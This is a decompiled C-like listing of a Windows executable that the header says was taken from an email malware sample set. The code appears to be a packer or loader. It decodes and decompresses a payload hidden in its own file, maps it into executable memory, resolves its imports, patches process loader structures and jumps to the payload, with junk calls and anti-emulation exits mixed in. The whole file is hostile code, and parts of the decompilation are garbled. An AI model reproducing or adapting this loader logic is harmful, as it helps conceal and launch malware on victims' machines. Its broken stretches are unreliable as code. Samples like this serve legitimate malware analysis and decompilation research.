// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0789/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000(Eq_29 dwArg04, Eq_29 dwArg08, Eq_29 dwArg0C)
{
	int32 dwLoc18_10 = 0x0075E7CA - dwLoc18;
	if ((word32) (word16) AddAtomA(0x00404000) == 0x00000000)
	{
		int32 edx_56 = globals->dw40416C;
		fp->dwFFFFFFF0 = 0x05347887;
		ExitProcess(0x00404000);
		globals->dw404184 = edx_56;
		dwLoc18_10 = edx_56;
	}
	globals->dw40416C = dwLoc18_10;
	int32 dwLoc0C_28 = 0x00000000;
	while (dwLoc0C_28 < dwArg0C)
	{
		fp->dwFFFFFFF0 = 0x00058B6D;
		dwArg04[dwLoc0C_28] = dwArg08[dwLoc0C_28];
		dwLoc0C_28 = dwLoc0C_28 + 0x00000001;
	}
	return;
}

word32 * fn00401090(word32 * ebp, word32 dwArg04, Eq_29 dwArg08, up32 dwArg0C)
{
	word16 ax_11 = (word16) AddAtomW(0x00404010);
	globals->dw404184 = 0x617918AE;
	if ((word32) ax_11 == 0x00000000)
	{
		globals->dw404184 = 0xF72F321C;
		fp->dwFFFFFFCC = 0x07744646;
		ExitProcess(0x00404010);
		globals->dw404184 = 0x00000000;
	}
	fp->dwFFFFFFCC = 0x004244AC << (byte) (0x00292A19 - globals->dw404184);
	if (dwArg0C <u 0x00000001)
		;
	else
	{
		byte dl_68 = *dwArg04;
		up32 dwLoc0C_112 = 0x00000001;
		word32 dwLoc1C_107 = 0x00000000;
		do
		{
			up32 edx_88 = dwLoc0C_112 + 0x00000001;
			byte cl_85 = dwArg04[dwLoc0C_112];
			dwLoc0C_112 = edx_88;
			if ((word32) cl_85 != (word32) dl_68)
			{
				dwArg08[dwLoc1C_107] = cl_85;
				globals->dw4041A4 = globals->dw404194 + globals->dw404194;
				dwLoc1C_107 = dwLoc1C_107 + 0x00000001;
			}
			else if ((word32) dwArg04[edx_88] == 0x00000000)
			{
				dwArg08[dwLoc1C_107] = dl_68;
				dwLoc1C_107 = dwLoc1C_107 + 0x00000001;
				dwLoc0C_112 = edx_88 + 0x00000001;
			}
			else
			{
				word32 eax_176 = fn00401260(fp - 0x00000014, dwArg04 + edx_88) + edx_88;
				dwLoc0C_112 = fn00401260(fp - 0x0000002C, dwArg04 + eax_176) + eax_176;
				up32 dwLoc20_194 = 0x00000000;
				while (dwLoc20_194 <u dwLoc14)
				{
					dwArg08[dwLoc1C_107] = dwArg08[dwLoc1C_107 - dwLoc2C];
					dwLoc1C_107 = dwLoc1C_107 + 0x00000001;
					dwLoc20_194 = dwLoc20_194 + 0x00000001;
				}
			}
		} while (dwLoc0C_112 <u dwArg0C);
	}
}

word32 fn00401260(word32 dwArg04, word32 dwArg08)
{
	word32 dwLoc0C_13 = 0x00000000;
	word32 dwLoc24_15 = 0x00000000;
	do
	{
		word32 ecx_18 = (word32) dwArg08->b0000;
		globals->dw404190 = globals->dw404170 *s globals->dw404190 >> (byte) globals->dw404190 << (byte) dwLoc08;
		word32 ecx_36 = dwLoc0C_13 << 0x00000007 | ecx_18 & 0x0000007F;
		word32 ecx_45 = dwLoc24_15 + 0x00000001;
		dwArg08 = dwArg08 + 1;
		dwLoc0C_13 = ecx_36;
		dwLoc08 = globals->dw404168 << (byte) dwLoc18;
		dwLoc24_15 = ecx_45;
	} while ((ecx_18 & 0x00000080) != 0x00000000);
	*dwArg04 = ecx_36;
	return ecx_45;
}

word32 fn004012F0(Eq_29 dwArg04)
{
	word32 eax_44;
	word32 eax_35 = CreateFileA(dwArg04, 0x80000000, 0x00000001, 0x00000000, 0x00000003, 0x00000080, 0x00000000);
	if (eax_35 == 0xFFFFFFFF)
		eax_44 = 0x00000000;
	else
		eax_44 = eax_35;
	return eax_44;
}

void fn00401360(word32 ebx, word32 ebp, word32 esi, word32 edi, Eq_1041 * fs, word32 dwArg04, word32 dwArg08)
{
	globals->dw4041A4 = WaitMessage;
	int32 edx_28 = globals->dw404170 + globals->dw404170 >> (byte) (0x000DEB2A - dwLoc0C);
	globals->dw404194 = 0x0012A617 << (byte) (dwLoc0C + globals->dw404190);
	globals->dw404194 = globals->dw4041A4 >> (byte) (dwLoc24 *s dwLoc18 + globals->dw404170);
	globals->dw404190 = globals->dw404168 *s globals->dw404194 + dwLoc24 *s 0x0006E132;
	globals->dw404190 = dwLoc24 << (byte) edx_28;
	globals->dw4041A4 = 0x0007A3A0 << (byte) dwLoc18 << (byte) (edx_28 *s 0x0005FBB8);
	globals->dw404194 = 0x000D0666;
	int32 edx_70 = dwLoc0C >> (byte) dwLoc18;
	globals->dw404194 = 0x00075B07 - edx_70;
	GetModuleHandleA(0x00000000);
	globals->dw404190 = 0x0018E7C9;
	LoadIconA(GetModuleHandleA(0x00000000), 0x00404054);
	globals->dw404190 = globals->dw404190 - 0x000C40A2 - globals->dw404170 + dwLoc0C;
	LoadCursorA(0x00000000, 0x00007F00);
	globals->dw4041A4 = 0x00043C90 >> (byte) dwLoc18;
	if ((word32) (word16) RegisterClassA(fp - 0x00000070) == 0x00000000)
	{
l00401D83:
		return;
	}
	else
	{
		if (dwArg08 != 0x00000001)
			globals->dw40418C = 0x00000000;
		else
		{
			globals->dw40418C = 0x00000001;
			globals->t404178 = dwArg04;
		}
		fp->dwFFFFFFF4 = globals->dw404194 << (byte) (dwLoc18 + globals->dw404170);
		fp->dwFFFFFFF4 = 0x00000000;
		Mem306[fp - 0x000001C0:word32] = GetModuleHandleA(0x00000000);
		CreateWindowExA(0x00000000, 0x004040CC, 0x004040AC, 0x00000001, 0x00028144, 0x00713746, 0x00001876, 0x00774934, 0x00000000, 0x00000000, null, 0x00000000);
		fp->dwFFFFFFF4 = globals->dw404168 + edx_70 << (byte) (globals->dw404194 - 0x000BDE2A);
		fp->dwFFFFFFF4 = 0x004040DC;
		if (GetBinaryTypeA(null, fp - 0x00000074) != 0x00000000)
			ExitProcess(0x00184376);
		Eq_29 dwLoc30_358;
		globals->dw404168 = VkKeyScanW;
		if (globals->dw40418C == 0x00000000)
			dwLoc30_358 = GetModuleHandleA(0x00000000);
		else
			dwLoc30_358 = dwArg04;
		globals->dw404190 = SetWindowLongW;
		globals->dw40416C = globals->dw404184 - (globals->dw40416C + 0x003473BC) *s globals->dw404184;
		globals->dw40416C = globals->dw40416C *s 0x00047E5E << (byte) globals->dw404184;
		IsRectEmpty(&fp->tFFFFFF78);
		word32 ecx_389 = globals->dw40416C *s 0x00374AE9 - 0x005C8945;
		globals->dw404170 = wvsprintfA;
		word32 edx_397 = dwLoc30_358 + Mem394[dwLoc30_358 + 0x0000003C:word32];
		globals->dw40416C = globals->dw40416C;
		fp->dwFFFFFFF4 = 0x00000000;
		Mem408[fp - 0x000001C0:word32] = GetModuleHandleA(&globals->t4040DC);
		fp->dwFFFFFFF4 = 0x00000000;
		fp->dwFFFFFFF4 = 0x00000000;
		fp->dwFFFFFFF4 = 0x00065975;
		fp->dwFFFFFFF4 = 0x00092545;
		fp->dwFFFFFFF4 = 0x01841188;
		fp->dwFFFFFFF4 = 0x00009956;
		fp->dwFFFFFFF4 = 0x00000001;
		fp->dwFFFFFFF4 = 0x004040FC;
		fp->dwFFFFFFF4 = 0x00404124;
		fp->dwFFFFFFF4 = 0x00000000;
		word32 eax_429 = CreateWindowExA(0x00000000, 0x004040CC, 0x004040AC, 0x00000001, 0x00028144, 0x00713746, 0x00001876, 0x00774934, 0x00000000, 0x00000000, &globals->t4040DC, 0x00000000);
		globals->dw404184 = 0x00000000 >> (byte) ecx_389;
		if (eax_429 != 0x00000000)
			;
		globals->dw404190 = CharToOemBuffW;
		Eq_588 * edx_454 = ((word32) edx_397->w0006 - 0x00000001) *s 0x00000028 + (&edx_397->w0014 + (word32) edx_397->w0014);
		word32 eax_460 = edx_454->dw0010 - 0x00000001 + edx_397->t003C;
		Eq_615 eax_470 = SEQ(SEQ(0x00000000, eax_460) % edx_397->t003C, eax_460) /u edx_397->t003C *s edx_397->t003C + edx_454->dw0014;
		globals->dw404168 = SetRectEmpty;
		fp->dwFFFFFFF4 = 0x00000200;
		Eq_29 eax_477 = fn004027D0(0x00000000);
		if (eax_477 == 0x00000000)
			goto l00401D83;
		else
		{
			globals->dw404170 = ValidateRgn;
			fp->dwFFFFFFF4 = 0x00000200;
			Mem494[fp - 0x000001C4:word32] = dwLoc30_358;
			GetModuleFileNameA(null, eax_477, (Eq_2200 *) 0x00000200);
			fp->dwFFFFFFF4 = &fp->tFFFFFE44;
			Mem513[fp - 0x000001C4:word32] = GetDesktopWindow();
			Mem517[fp - 0x000001C4:word32] = GetDC(null);
			GetTextFaceA(null, 0x000000FF, (Eq_2200 *) 0x00000200);
			if (true)
				;
			globals->dw404170 = globals->dw404170 << 0xFFFFFFAE;
			Eq_29 eax_537 = fn004012F0(eax_477);
			if (eax_537 == 0x00000000)
				goto l00401D83;
			else
			{
				globals->dw404190 = edx_70 * 0x00000002 + globals->dw4041A4 + edx_70;
				globals->dw404170 = SetWinEventHook;
				Mem556[fp - 0x000001C0:word32] = eax_537;
				Eq_732 eax_559 = GetFileSize(0x000000FF, 0x00000000) - eax_470;
				globals->dw4041A4 = CloseWindow;
				if (eax_559 == 0x00000000)
					goto l00401D83;
				else
				{
					fp->dwFFFFFFF4 = eax_559.u0;
					Eq_29 eax_573 = fn004027D0(0x00000000);
					if (eax_573 == 0x00000000)
						goto l00401D83;
					else
					{
						globals->dw404194 = globals->dw404170 + 0x000ECC97 + dwLoc18;
						Mem594[fp - 0x000001C8:word32] = eax_537;
						SetFilePointer(null, eax_470, 0x00000000, 0x00000000);
						Mem607[fp - 0x000001C8:word32] = eax_573;
						Mem610[fp - 0x000001CC:word32] = eax_537;
						if (ReadFile((Eq_2200 *) 0x00065975, null, eax_559, fp - 0x00000038, 0x00000000) == 0x00000000)
							goto l00401D83;
						else
						{
							globals->dw404194 = FlashWindow;
							globals->dw404170 = edx_70 *s 0x001091F1 >> 0xFFFFFFD0;
							Mem627[fp - 0x000001BC:word32] = eax_537;
							CloseHandle(0x00000000);
							globals->dw404170 = GetShellWindow;
							if (dwLoc38 != eax_559)
								goto l00401D83;
							else
							{
								globals->dw4041A4 = CreateAcceleratorTableA;
								if (ClientToScreen(GetDesktopWindow(), &fp->tFFFFFE44) == 0x00000000)
									ExitProcess(0x00009273);
								globals->dw404170 = 0x00000000 >> (byte) globals->dw404194;
								globals->dw4041A4 = 0xFFFFFFFF;
								word32 eax_681 = GetBinaryTypeW(0x00404130, &fp->tFFFFFE44);
								globals->dw404170 = globals->dw404170 *s globals->dw4041A4 >> (byte) globals->dw404190 << (byte) globals->dw404194;
								if (eax_681 != 0x00000000)
								{
									fp->dwFFFFFFF4 = 0x000220E7 >> (byte) globals->dw404170;
									ExitProcess(0x00000258);
								}
								Mem703[fp - 0x000001C0:word32] = eax_573 - 0x00000040 + eax_559;
								fn00401000(eax_573, 0x00404130, 0x00000040);
								globals->dw4041A4 = SetWindowPlacement;
								globals->dw40416C = 0x001FD8B9;
								word16 ax_714 = (word16) AddAtomA(0x00404150);
								if ((word32) ax_714 == 0x00000000)
								{
									globals->dw404184 = 0x0022A8BF;
									fp->dwFFFFFFF4 = 0x00155237;
									ExitProcess(0x00404150);
									globals->dw40416C = globals->dw40416C;
								}
								word32 ecx_724 = Mem710[eax_573 + 0x00000000:word32];
								globals->dw4041A4 = ReleaseDC;
								globals->dw40416C = 0x0078C9B2;
								if (GetBkColor(0x00292D50) == 0xFFFFFFFF)
									;
								globals->dw404184 = 0xF5520950;
								word32 eax_741 = Mem739[eax_573 + 0x00000004:word32];
								up32 dwLoc10_743 = 0x00000000;
								while (dwLoc10_743 <u ecx_724)
								{
									globals->dw404170 = CreateMDIWindowW;
									(eax_573 + dwLoc10_743)->dw0008 = (eax_573 + dwLoc10_743)->dw0008 ^ 0x0000AE7A;
									dwLoc10_743 = dwLoc10_743 + 0x00000008;
								}
								Mem771[fp - 0x000001BC:word32] = eax_741;
								globals->t404188 = fn004027D0(0x00292D50);
								if (globals->t404188 == 0x00000000)
									ExitProcess(0x00000245);
								word32 esp_828;
								word32 ebp_788 = fn00401090(fp - 0x00000004, eax_573 + 0x00000008, Mem774[0x00404188:word32], ecx_724);
								fp->dwFFFFFFF4 = 0x00401CB4;
								ebp_788->dwFFFFFFF8 = 0x00012A80;
								ebp_788->dwFFFFFFF8 = fp->dwFFFFFFF4;
								globals->dw4041A4 = ebp_788->dwFFFFFFF8 + ebp_788->dwFFFFFFF8 >> 0xFFFFFFBD;
								globals->ptr40419C = fs->ptr0018;
								ebp_788->dwFFFFFFF8 = globals->dw404168 >> (byte) (globals->dw404168 - 0x000170D5);
								globals->dw404174 = edi;
								globals->dw404164 = esi;
								globals->dw404180 = ebx;
								ebp_788->dwFFFFFFF8 = ebp_788->dwFFFFFFF8 *s 0x00000000;
								globals->ptr40417C = ebp_788;
								globals->dw404194 = globals->dw404170 >> (byte) (globals->dw4041A4 + 0x00037709);
								if (globals->dw40418C != 0x00000000)
								{
									Mem889[fp - 0x000001BC:word32] = Mem823[ebp_788 - 0x0000000C:word32] - Mem823[0x00404178:word32];
									fn00401D90(dwArg00);
									esp_828 = fp - 0x000001B8;
								}
								else
								{
									fp->dwFFFFFFF4 = 0x00000000;
									Mem900[fp - 0x000001BC:word32] = Mem893[ebp_788 - 0x0000000C:word32] - GetModuleHandleA(fp->dwFFFFFFF4);
									fn00401D90(dwArg00);
									esp_828 = fp - 0x000001B8;
								}
								Eq_29 * esp_830 = esp_828 - 0x00000004;
								Mem831[esp_830 + 0x00000000:word32] = Mem823[0x00404188:word32];
								if (fn00402010(dwArg00) == 0x00000000)
								{
									Mem879[esp_830 + 0x00000000:word32] = Mem831[0x00404188:word32];
									fn00402790(dwArg00);
									Mem883[esp_830 + 0x00000000:word32] = 0x00000196;
									ExitProcess(Mem883[esp_830 + 0x00000000:UINT]);
								}
								globals->dw404168 = 0x000510E0 >> (byte) (globals->dw404194 - ebp_788->dwFFFFFFF8);
								ebp_788->dwFFFFFFF8 = globals->dw404170 >> 0x00000019 >> (byte) (globals->dw404168 + ebp_788->dwFFFFFFF8);
								ebp_788->dwFFFFFFF8 = 0x000D47BA << (byte) globals->dw404170 >> (byte) globals->dw4041A4;
								int32 eax_867 = ebp_788->dwFFFFFFF8 << 0x00000025 >> (byte) ebp_788->dwFFFFFFF8;
								globals->dw404190 = eax_867;
								int32 ecx_872 = ebp_788->dwFFFFFFF8;
								uint8 cl_873 = (byte) ecx_872;
								int32 edx_874 = globals->dw404168 + 0x00001D90 >> cl_873;
								ebp_788->dwFFFFFFF8 = edx_874;
								Mem876[0x004041A0:word32]();
								return;
							}
						}
					}
				}
			}
		}
	}
}

void fn00401D90(word32 dwArg04)
{
fn00401D90_entry:
l00401D90:
	Eq_29 dwLoc3C_21
	globals->dw404168 = globals->dw404194 *s 0x0001CCDC << (byte) (dwLoc20 *s 0x000B17CD);
	branch globals->dw40418C == 0x00000000 l00401DC6
l00401DBB:
	dwLoc3C_21 = globals->t404178;
	goto l00401DD1
l00401DC6:
	&*dwLoc44.u0 = 0x00000000;
	dwLoc3C_21 = GetModuleHandleA(0x00000000);
l00401DD1:
	branch dwLoc3C_21 != 0x00000000 l00401DDE
l00401DD7:
	goto l00401F75
l00401DDE:
	word32 eax_53 = dwLoc3C_21 + Mem18[dwLoc3C_21 + 0x0000003C:word32]
	fp->tFFFFFFBC.u0 = 0x00000040;
	globals->t404198 = VirtualAlloc(0x00000000, eax_53->t0050, 0x00003000, null);
	branch globals->t404198 != 0x00000000 l00401E15
l00401E0E:
	goto l00401F75
l00401E15:
	int32 eax_77 = 0x000BCEE8 >> (byte) (0x000F0C02 - globals->dw404168)
	fp->tFFFFFFBC = eax_53->t0050;
	Mem86[fp - 0x00000048:word32] = dwLoc3C_21
	fn00401000(globals->t404198, 0x00003000, dwLoc44)
	word32 edx_92 = globals->t404198 - dwLoc3C_21
	branch eax_53->dw00A4 == 0x00000000 l00401F63
l00401E60:
	Eq_1312 * dwLoc14_126 = dwLoc3C_21 + Mem86[eax_53 + 0x000000A0:word32]
l00401E6F:
	branch dwLoc14_126->dw0004 == 0x00000000 l00401F63
l00401E7C:
	globals->dw404194 = eax_77 >> 0xFFFFFFDD << (byte) (0x000D0E26 - globals->dw404190);
	uint32 ecx_150 = dwLoc14_126->dw0004 - 0x00000008 >>u 0x00000001
	globals->dw4041A4 = dwLoc08 >> (byte) dwLoc1C >> (byte) (globals->dw4041A4 *s dwLoc08);
	globals->dw404190 = dwLoc2C + globals->dw4041A4 + globals->dw404194 << 0xFFFFFF86;
	word16 * eax_164[] = &dwLoc14_126->a0008[0]
	uint32 dwLoc0C_173 = 0x00000000
	goto l00401EF0
l00401EE7:
	dwLoc0C_173 = dwLoc0C_173 + 0x00000001;
l00401EF0:
	branch dwLoc0C_173 >=u ecx_150 l00401F52
l00401EF8:
	branch (word32) eax_164[dwLoc0C_173] >> 0x0000000C != 0x00000003 l00401F50
l00401F13:
	(Mem172[0x00404198:word32] + Mem172[dwLoc14_126 + 0x00000000:word32])[(word32) eax_164[dwLoc0C_173] & 0x00000FFF] = (Mem172[0x00404198:word32] + Mem172[dwLoc14_126 + 0x00000000:word32])[(word32) eax_164[dwLoc0C_173] & 0x00000FFF] + edx_92;
l00401F50:
	goto l00401EE7
l00401F52:
	dwLoc14_126 = dwLoc14_126 + Mem172[dwLoc14_126 + 0x00000004:word32];
	goto l00401E6F
l00401F63:
l00401F75:
	return
fn00401D90_exit:
}

word32 fn00402010(word32 dwArg04)
{
	word32 eax_280;
	word32 edx_16 = dwArg04 + Mem0[dwArg04 + 0x0000003C:word32];
	Eq_1419 * dwLoc2C_122 = &edx_16->w0014 + (word32) edx_16->w0014;
	Eq_29 eax_33 = VirtualAlloc(0x00000000, edx_16->t0050, 0x00003000, 0x00000040);
	if (eax_33 == 0x00000000)
		eax_280 = 0x00000000;
	else
	{
		int32 eax_96 = 0x00064DDA - globals->dw404190 >> (byte) dwLoc30;
		Mem106[fp - 0x0000005C:word32] = Mem0[dwArg04 + 0x0000003C:word32] + 0x00000138 + (word32) Mem0[edx_16 + 0x00000006:word16] *s 0x00000028;
		Mem109[fp - 0x00000060:word32] = dwArg04;
		fn00401000(eax_33, 0x00003000, 0x00000040);
		up32 dwLoc10_115 = 0x00000000;
		while (dwLoc10_115 <u (word32) edx_16->w0006)
		{
			globals->dw4041A4 = dwLoc08 << (byte) (globals->dw4041A4 + eax_96);
			if (dwLoc2C_122->dw0014 != 0x00000000 && dwLoc2C_122->dw0010 != 0x00000000)
			{
				word32 eax_168 = dwLoc2C_122->dw0010 - 0x00000001 + edx_16->t003C;
				fn00401000(eax_33 + Mem137[dwLoc2C_122 + 0x0000000C:word32], dwArg04 + Mem137[dwLoc2C_122 + 0x00000014:word32], SEQ(SEQ(0x00000000, eax_168) % edx_16->t003C, eax_168) /u edx_16->t003C *s edx_16->t003C);
			}
			globals->dw404170 = dwLoc20 << (byte) globals->dw404168;
			dwLoc2C_122 = dwLoc2C_122 + 1;
			dwLoc10_115 = dwLoc10_115 + 0x00000001;
		}
		word32 eax_196 = eax_33 + Mem109[eax_33 + 0x0000003C:word32];
		Eq_1482 * dwLoc54_202 = eax_33 + Mem109[eax_196 + 0x00000080:word32];
		while (dwLoc54_202->dw0010 != 0x00000000)
		{
			Eq_29 eax_225 = GetModuleHandleA(eax_33 + Mem109[dwLoc54_202 + 0x0000000C:word32]);
			Eq_29 dwLoc18_227 = eax_225;
			if (eax_225 == 0x00000000)
			{
				if (globals->dw40418C != 0x00000000)
				{
					eax_280 = 0x00000000;
					goto l0040262F;
				}
				Eq_29 eax_358 = LoadLibraryA(eax_33 + Mem109[dwLoc54_202 + 0x0000000C:word32]);
				globals->dw404194 = dwLoc08 - globals->dw404168 *s 0x000CC011;
				dwLoc18_227 = eax_358;
				if (eax_358 == 0x00000000)
				{
					eax_280 = 0x00000000;
					goto l0040262F;
				}
				goto l004021CD;
			}
l004021CD:
			Eq_1563 * dwLoc40_241;
			Eq_1564 * dwLoc28_240;
			dwLoc30 = globals->dw404194 + 0x00091D85;
			if (dwLoc54_202->dw0000 != 0x00000000)
			{
				dwLoc28_240 = eax_33 + Mem109[dwLoc54_202 + 0x00000000:word32];
				dwLoc40_241 = eax_33 + Mem109[dwLoc54_202 + 0x00000010:word32];
			}
			else
			{
				dwLoc28_240 = eax_33 + Mem109[dwLoc54_202 + 0x00000010:word32];
				dwLoc40_241 = eax_33 + Mem109[dwLoc54_202 + 0x00000000:word32];
			}
			if (dwLoc54_202->dw0010 != 0x00000000 && dwLoc54_202->dw0000 != 0x00000000)
			{
				fp->dwFFFFFFEC = 0x00000001;
				goto l00402233;
			}
l00402233:
			while (dwLoc28_240->dw0000 != 0x00000000)
			{
				globals->dw404194 = globals->dw404168 *s 0x00029784 - globals->dw404170;
				if ((dwLoc28_240->dw0000 & 0x80000000) != 0x00000000)
					dwLoc28_240->dw0000 = GetProcAddress(dwLoc18_227, dwLoc28_240->dw0000 & 0x7FFFFFFF);
				else
					dwLoc28_240->dw0000 = GetProcAddress(dwLoc18_227, dwLoc28_240->dw0000 + 0x00000002 + eax_33);
				if (dwLoc28_240->dw0000 == 0x00000000)
				{
					eax_280 = 0x00000000;
					goto l0040262F;
				}
				if (0x00000000 != 0x00000000)
					dwLoc40_241->dw0000 = dwLoc28_240->dw0000;
				dwLoc28_240 = dwLoc28_240 + 1;
				dwLoc40_241 = dwLoc40_241 + 1;
			}
			dwLoc54_202 = dwLoc54_202 + 1;
		}
		if (globals->dw40418C != 0x00000000)
		{
			word32 edx_684 = globals->t404178 - eax_196->t0034;
			if (eax_196->dw00A4 != 0x00000000)
			{
				Eq_1656 * dwLoc1C_693 = eax_33 + Mem109[eax_196 + 0x000000A0:word32];
				while (dwLoc1C_693->dw0004 != 0x00000000)
				{
					uint32 edx_710 = dwLoc1C_693->dw0004 - 0x00000008 >>u 0x00000001;
					word16 * eax_713[] = &dwLoc1C_693->a0008[0];
					uint32 dwLoc10_716 = 0x00000000;
					while (dwLoc10_716 <u edx_710)
					{
						dwLoc30 = 0x000160BD << (byte) globals->dw404190;
						if ((word32) eax_713[dwLoc10_716] >> 0x0000000C == 0x00000003)
							(eax_33 + Mem109[dwLoc1C_693 + 0x00000000:word32])[(word32) eax_713[dwLoc10_716] & 0x00000FFF] = (eax_33 + Mem109[dwLoc1C_693 + 0x00000000:word32])[(word32) eax_713[dwLoc10_716] & 0x00000FFF] + edx_684;
						dwLoc10_716 = dwLoc10_716 + 0x00000001;
					}
					dwLoc1C_693 = dwLoc1C_693 + Mem109[dwLoc1C_693 + 0x00000004:word32];
				}
			}
		}
		Eq_29 ecx_391 = eax_196->t0050;
		fp->dwFFFFFFEC = 0x00000004;
		Eq_1627 eax_402 = CreateFileMappingA(0xFFFFFFFF, 0x00000000, 0x00000000, 0x00000000, ecx_391, 0x00000000);
		if (eax_402 == 0x00000000)
			eax_280 = 0x00000000;
		else
		{
			globals->dw404168 = dwLoc08 *s 0x000238DD *s 0x000A2E82;
			if (globals->dw40418C != 0x00000000)
			{
				Mem649[fp - 0x0000005C:word32] = Mem414[0x00404178:word32];
				fp->dwFFFFFFEC = 0x00000000;
				fp->dwFFFFFFEC = 0x00000000;
				fp->dwFFFFFFEC = 0x00000022;
				fp->dwFFFFFFEC = eax_402.u0;
				globals->t404198 = MapViewOfFileEx(0xFFFFFFFF, 0x00000000, (Eq_2200 *) 0x00000004, 0x00000000, 0x00000000, null);
			}
			else
			{
				Mem667[fp - 0x0000005C:word32] = Mem414[eax_196 + 0x00000034:word32];
				fp->dwFFFFFFEC = 0x00000000;
				fp->dwFFFFFFEC = 0x00000000;
				fp->dwFFFFFFEC = 0x00000022;
				fp->dwFFFFFFEC = eax_402.u0;
				globals->t404198 = MapViewOfFileEx(0xFFFFFFFF, 0x00000000, (Eq_2200 *) 0x00000004, 0x00000000, 0x00000000, 0x00000000);
			}
			if (globals->t404198 == 0x00000000)
			{
				globals->dw404190 = dwLoc30 - dwLoc20 *s 0x00073224;
				if (globals->dw40418C == 0x00000000)
					if (UnmapViewOfFile(eax_196->t0034) == 0x00000000)
					{
						fp->dwFFFFFFEC = 0x00000000;
						Mem637[fp - 0x00000064:word32] = Mem633[eax_196 + 0x00000034:word32];
						if (VirtualFree(null, 0x00000000, 0x00008000) == 0x00000000)
							eax_280 = 0x00000000;
						else
							goto l004024D3;
					}
					else
						goto l004024D3;
				else if (UnmapViewOfFile(globals->t404178) == 0x00000000)
				{
					fp->dwFFFFFFEC = 0x00000000;
					Mem611[fp - 0x00000064:word32] = Mem608[0x00404178:word32];
					if (VirtualFree(null, 0x00000000, 0x00008000) == 0x00000000)
						eax_280 = 0x00000000;
					else
					{
l004024A1:
l004024D3:
						if (globals->dw40418C != 0x00000000)
						{
							Eq_29 ecx_555 = globals->t404178;
							fp->dwFFFFFFEC = 0x00000000;
							fp->dwFFFFFFEC = 0x00000000;
							fp->dwFFFFFFEC = 0x00000022;
							globals->t404198 = MapViewOfFileEx(eax_402, 0x00000022, null, 0x00000000, 0x00000000, ecx_555);
						}
						else
						{
							Eq_29 ecx_573 = eax_196->t0034;
							fp->dwFFFFFFEC = 0x00000000;
							fp->dwFFFFFFEC = 0x00000000;
							fp->dwFFFFFFEC = 0x00000022;
							globals->t404198 = MapViewOfFileEx(eax_402, 0x00000022, null, 0x00000000, 0x00000000, ecx_573);
						}
						if (globals->t404198 != 0x00000000)
							goto l0040257E;
						else
						{
							if (globals->dw40418C != 0x00000000)
							{
								fp->dwFFFFFFEC = 0x00003000;
								Mem533[fp - 0x00000064:word32] = Mem529[eax_196 + 0x00000050:word32];
								Mem536[fp - 0x00000068:word32] = Mem533[0x00404178:word32];
								globals->t404198 = VirtualAlloc(null, 0x00000000, null, 0x00000040);
							}
							else
							{
								fp->dwFFFFFFEC = 0x00003000;
								Mem547[fp - 0x00000064:word32] = Mem543[eax_196 + 0x00000050:word32];
								Mem551[fp - 0x00000068:word32] = Mem547[eax_196 + 0x00000034:word32];
								globals->t404198 = VirtualAlloc(null, 0x00000000, null, 0x00000040);
							}
							if (globals->t404198 == 0x00000000)
								eax_280 = 0x00000000;
							else
							{
l0040257E:
								globals->dw404168 = 0x000101F8 << (byte) (dwLoc08 *s 0x00099797);
								fn00401000(globals->t404198, eax_33, eax_196->t0050);
								if (globals->dw40418C != 0x00000000)
									fn00402640(globals->t404178, Mem433[0x00404198:word32] + Mem433[eax_196 + 0x00000028:word32]);
								else
									fn00402720(globals->t404198);
								Mem456[0x004041A0:word32] = Mem433[0x00404198:word32] + Mem433[eax_196 + 0x00000028:word32];
								eax_196->ptr0028 = globals->ptr4041A0;
								eax_280 = 0x00000001;
							}
						}
					}
				}
				else
					goto l004024A1;
			}
			else
				goto l0040257E;
		}
	}
l0040262F:
	return eax_280;
}

void fn00402640(Eq_29 dwArg04, word32 dwArg08)
{
	Eq_2094 * ecx_24 = globals->ptr40419C->ptr0030->ptr000C->ptr000C;
	int32 eax_8 = globals->dw4041A4;
	Eq_2094 * dwLoc1C_25 = ecx_24;
	while (0x00000001 != 0x00000000)
	{
		if (dwLoc1C_25 == null)
			goto l0040270E;
		globals->dw404194 = 0x000DCC0D - dwLoc28 - dwLoc18;
		if (dwLoc1C_25->dw0018 == dwArg04)
		{
			dwLoc1C_25->dw001C = dwArg08;
			goto l0040270E;
		}
		Eq_2094 * ecx_87 = dwLoc1C_25->ptr0000;
		dwLoc18 = eax_8 + 0x000BC690 >> 0x0000001E << 0xFFFFFFCB;
		dwLoc1C_25 = ecx_87;
		if (ecx_87 == ecx_24)
			goto l0040270E;
	}
l0040270E:
	return;
}

void fn00402720(Eq_29 dwArg04)
{
	Eq_1043 * ecx_13 = globals->ptr40419C;
	globals->dw404190 = 0x000095F7 << (byte) globals->dw404170;
	ecx_13->ptr0030->dw0008 = dwArg04;
	globals->dw404170 = dwLoc10 >> (byte) (globals->dw4041A4 + globals->dw404194) << (byte) dwLoc0C;
	return;
}

void fn00402790(word32 dwArg04)
{
	HeapFree(GetProcessHeap(), 0x00000000, dwArg04);
	return;
}

word32 fn004027D0(word32 dwArg04)
{
	return HeapAlloc(GetProcessHeap(), 0x00000000, dwArg04);
}

